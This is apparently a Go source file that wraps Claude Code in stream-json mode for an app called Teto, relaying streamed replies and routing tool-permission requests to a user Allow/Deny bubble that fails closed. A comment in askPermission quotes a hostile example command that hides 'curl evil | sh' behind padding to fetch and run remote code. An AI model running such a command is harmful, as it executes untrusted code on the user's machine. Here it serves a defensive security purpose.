package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"os/exec"
	"strings"
	"sync"
	"time"
)

// Claude drives one long-lived `claude -p` process in stream-json mode.
//
// Wire format (verified against Claude Code 2.1, see docs/PROTOCOL.md):
//   - we write JSON lines to its stdin: user messages and control
//     requests (initialize, interrupt) and control responses (permission
//     answers);
//   - it writes JSON lines to stdout: system/assistant/user/result
//     messages, partial "stream_event"s, and control requests such as
//     "can_use_tool" when it wants permission.
type Claude struct {
	Bin, Workdir, Model, Persona string
	Hub                          *Hub
	OnReply                      func(text string) // called after each finished reply

	mu      sync.Mutex
	stdin   io.WriteCloser
	running bool
	busy    bool
	pending map[string]chan bool // permission request id -> user's answer
	done    chan struct{}        // closed when the process has exited
}

// Close ends the Claude process: closing stdin is Claude Code's normal
// "no more input" signal, then we wait for it to exit. On Windows this
// matters: a live child keeps its working folder locked.
func (c *Claude) Close() {
	c.mu.Lock()
	if !c.running {
		c.mu.Unlock()
		return
	}
	done := c.done
	_ = c.stdin.Close()
	c.mu.Unlock()
	<-done
}

var ErrBusy = errors.New("still answering the previous prompt")

// PermissionTimeout: if nobody answers the bubble, the request is denied.
// Denying is the safe default ("fail closed").
const PermissionTimeout = 5 * time.Minute

// DisallowedTools: "Permission required: No" in the Claude Code tools
// reference, and able to act beyond the working folder (see docs/SECURITY.md).
var DisallowedTools = []string{"RemoteTrigger", "CronCreate", "CronDelete", "SendUserFile", "PushNotification"}

func (c *Claude) args() []string {
	a := []string{
		"-p",
		"--input-format", "stream-json",
		"--output-format", "stream-json",
		"--verbose",                         // required by stream-json output
		"--include-partial-messages",        // token-by-token text for the bubble
		"--permission-prompt-tool", "stdio", // send can_use_tool to us
		// "manual": without it Claude Code auto-approves commands it
		// considers safe and we never get asked (found live, see docs).
		"--permission-mode", "manual",
		// Tools that run WITHOUT a permission prompt even in manual mode
		// and reach outside this PC or schedule work; Teto never needs them.
		// One comma-joined value: the flag is variadic and would otherwise
		// swallow the arguments after it.
		"--disallowedTools", strings.Join(DisallowedTools, ","),
		"--append-system-prompt", c.Persona,
	}
	if c.Model != "" {
		a = append(a, "--model", c.Model)
	}
	return a
}

// start launches the process. Caller holds c.mu.
func (c *Claude) start() error {
	cmd := exec.Command(c.Bin, c.args()...)
	cmd.Dir = c.Workdir
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}
	cmd.Stderr = logWriter{prefix: "claude stderr: "}
	if err := cmd.Start(); err != nil {
		if errors.Is(err, exec.ErrNotFound) {
			// The most likely problem for someone who just installed Teto.
			return fmt.Errorf("Claude Code isn't installed (or isn't on PATH): install it from https://code.claude.com and log in, then try again: %w", err)
		}
		return fmt.Errorf("start claude: %w", err)
	}
	c.stdin, c.running, c.pending, c.done = stdin, true, make(map[string]chan bool), make(chan struct{})
	go c.readLoop(stdout, cmd)
	return c.writeLocked(map[string]any{
		"type": "control_request", "request_id": newID(),
		"request": map[string]any{"subtype": "initialize"},
	})
}

// Prompt sends one user message. Only one prompt runs at a time.
func (c *Claude) Prompt(text string) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.busy {
		return ErrBusy
	}
	if !c.running {
		if err := c.start(); err != nil {
			return err
		}
	}
	c.busy = true
	c.Hub.Publish(Event{"type": "status", "state": "thinking"})
	return c.writeLocked(map[string]any{
		"type":    "user",
		"message": map[string]any{"role": "user", "content": text},
	})
}

// Interrupt asks Claude Code to stop the current turn.
func (c *Claude) Interrupt() error {
	c.mu.Lock()
	defer c.mu.Unlock()
	if !c.running {
		return nil
	}
	return c.writeLocked(map[string]any{
		"type": "control_request", "request_id": newID(),
		"request": map[string]any{"subtype": "interrupt"},
	})
}

// AnswerPermission delivers the user's Allow/Deny click.
func (c *Claude) AnswerPermission(id string, allow bool) error {
	c.mu.Lock()
	ch, ok := c.pending[id]
	delete(c.pending, id)
	c.mu.Unlock()
	if !ok {
		return fmt.Errorf("no pending permission %q", id)
	}
	ch <- allow // buffered (cap 1), never blocks
	return nil
}

func (c *Claude) writeLocked(v any) error {
	b, err := json.Marshal(v)
	if err != nil {
		return err
	}
	_, err = c.stdin.Write(append(b, '\n'))
	return err
}

func (c *Claude) write(v any) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	if !c.running {
		return errors.New("claude not running")
	}
	return c.writeLocked(v)
}

// wireMsg holds the fields we use from any stdout line; json ignores the rest.
type wireMsg struct {
	Type      string          `json:"type"`
	Subtype   string          `json:"subtype"`
	RequestID string          `json:"request_id"`
	Request   json.RawMessage `json:"request"`
	Event     *struct {
		Type  string `json:"type"`
		Delta *struct {
			Type string `json:"type"`
			Text string `json:"text"`
		} `json:"delta"`
	} `json:"event"`
	Message *struct {
		Content []struct {
			Type  string          `json:"type"`
			Name  string          `json:"name"`
			Input json.RawMessage `json:"input"`
		} `json:"content"`
	} `json:"message"`
	Result  string `json:"result"`
	IsError bool   `json:"is_error"`
}

type canUseTool struct {
	Subtype  string          `json:"subtype"`
	ToolName string          `json:"tool_name"`
	Input    json.RawMessage `json:"input"`
}

func (c *Claude) readLoop(stdout io.Reader, cmd *exec.Cmd) {
	sc := bufio.NewScanner(stdout)
	sc.Buffer(make([]byte, 64*1024), 32*1024*1024) // tool results can be huge lines
	for sc.Scan() {
		var m wireMsg
		if err := json.Unmarshal(sc.Bytes(), &m); err != nil {
			log.Printf("claude: bad line: %v", err)
			continue
		}
		c.handle(m)
	}
	err := cmd.Wait()
	log.Printf("claude exited: %v", err)
	c.mu.Lock()
	c.running, c.busy = false, false
	for id, ch := range c.pending {
		ch <- false
		delete(c.pending, id)
	}
	close(c.done)
	c.mu.Unlock()
	c.Hub.Publish(Event{"type": "status", "state": "idle"})
}

func (c *Claude) handle(m wireMsg) {
	switch m.Type {
	case "stream_event":
		if m.Event != nil && m.Event.Delta != nil && m.Event.Delta.Type == "text_delta" {
			c.Hub.Publish(Event{"type": "text_delta", "text": m.Event.Delta.Text})
		}
	case "assistant":
		if m.Message == nil {
			return
		}
		for _, block := range m.Message.Content {
			if block.Type == "tool_use" {
				c.Hub.Publish(Event{"type": "tool_use", "tool": block.Name, "summary": summarize(block.Name, block.Input)})
			}
		}
	case "control_request":
		var req canUseTool
		if err := json.Unmarshal(m.Request, &req); err != nil || req.Subtype != "can_use_tool" {
			// Unknown control request: answer with an error so Claude doesn't hang.
			_ = c.write(map[string]any{"type": "control_response", "response": map[string]any{
				"subtype": "error", "request_id": m.RequestID, "error": "unsupported by teto brain"}})
			return
		}
		go c.askPermission(m.RequestID, req)
	case "result":
		c.mu.Lock()
		c.busy = false
		c.mu.Unlock()
		c.Hub.Publish(Event{"type": "reply_done", "text": m.Result, "is_error": m.IsError})
		c.Hub.Publish(Event{"type": "status", "state": "idle"})
		if c.OnReply != nil && !m.IsError {
			go c.OnReply(m.Result)
		}
	}
}

// askPermission shows the bubble and waits for the click (or the timeout).
func (c *Claude) askPermission(requestID string, req canUseTool) {
	ch := make(chan bool, 1)
	c.mu.Lock()
	c.pending[requestID] = ch
	c.mu.Unlock()
	// "detail" is the COMPLETE input. Never ask for approval of something
	// the user can't fully see: a 160-char summary could hide
	// "echo hi <200 spaces> && curl evil | sh" (security review, finding 1).
	c.Hub.Publish(Event{"type": "permission_request", "id": requestID,
		"tool": req.ToolName, "summary": summarize(req.ToolName, req.Input),
		"detail": fullDetail(req.Input)})

	allow := false
	select {
	case allow = <-ch:
	case <-time.After(PermissionTimeout):
		c.mu.Lock()
		delete(c.pending, requestID)
		c.mu.Unlock()
		c.Hub.Publish(Event{"type": "permission_expired", "id": requestID})
	}

	decision := map[string]any{"behavior": "deny", "message": "The user denied this in Teto's bubble."}
	if allow {
		decision = map[string]any{"behavior": "allow", "updatedInput": req.Input}
	}
	if err := c.write(map[string]any{"type": "control_response", "response": map[string]any{
		"subtype": "success", "request_id": requestID, "response": decision}}); err != nil {
		log.Printf("claude: cannot answer permission: %v", err)
	}
}

// summarize turns tool input into one short line for the speech bubble.
func summarize(tool string, input json.RawMessage) string {
	var in map[string]any
	_ = json.Unmarshal(input, &in)
	for _, key := range []string{"command", "file_path", "path", "pattern", "url", "description"} {
		if v, ok := in[key].(string); ok && v != "" {
			return truncate(v, 160)
		}
	}
	return truncate(string(input), 160)
}

// fullDetail renders the whole tool input for the permission card:
// a shell command as-is, anything else as indented JSON.
func fullDetail(input json.RawMessage) string {
	var in map[string]any
	if err := json.Unmarshal(input, &in); err == nil {
		if cmd, ok := in["command"].(string); ok && len(in) <= 3 {
			// Bash/PowerShell: the command is what matters; show other keys below it.
			rest := map[string]any{}
			for k, v := range in {
				if k != "command" {
					rest[k] = v
				}
			}
			if len(rest) == 0 {
				return cmd
			}
			extra, _ := json.MarshalIndent(rest, "", "  ")
			return cmd + "\n\n" + string(extra)
		}
	}
	var pretty bytes.Buffer
	if err := json.Indent(&pretty, input, "", "  "); err != nil {
		return string(input)
	}
	return pretty.String()
}

func truncate(s string, n int) string {
	r := []rune(s)
	if len(r) <= n {
		return s
	}
	return string(r[:n-1]) + "…"
}

func newID() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

type logWriter struct{ prefix string }

func (w logWriter) Write(p []byte) (int, error) {
	log.Print(w.prefix + string(p))
	return len(p), nil
}
